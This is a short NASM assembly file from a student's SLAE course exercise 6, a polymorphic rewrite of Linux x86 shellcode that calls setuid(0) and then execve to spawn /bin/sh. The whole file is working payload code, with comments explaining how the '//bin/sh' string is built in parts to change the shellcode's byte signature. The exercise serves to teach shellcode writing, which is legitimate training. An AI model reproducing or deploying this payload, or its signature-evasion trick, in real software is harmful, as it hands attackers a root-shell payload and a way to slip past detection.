;Filename: setuid_mod.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 6

global _start

section .text

_start:
	;xor eax,eax
	;xor ebx,ebx
	SHL ebx, 0x10		;shift all values to left, result in 00000000
	SHL ebx, 0x10		;Sadly SHL didn't accept 0x20 (32bits) so we have to seperate them
	;xor ecx,ecx
	SHL ecx, 0x10
	SHL ecx, 0x10		;shift all values to left, result in 00000000
	mul ebx
	mov al,0x17
	int 0x80
	xor eax,eax
	push eax

	;push dword 0x68732f6e	
	mov dx, 0x6873		;Instead of pushing the whole word, we push to by parts and use SHL to adjust
	SHL edx, 16
	mov dx, 0x2f6e
	push edx
	
	;push dword 0x69622f2f
	mov dx, 0x6962		;Instead of pushing the whole word, we push to by parts and use SHL to adjust
	SHL edx, 16
	mov dx, 0x2f2f
	push edx

	mov ebx,esp
	lea edx,[esp+0x8]
	push eax
	push ebx
	lea ecx,[esp]
	mov al,0xb
	int 0x80
	xor eax,eax
	mov al,0x1
	int 0x80
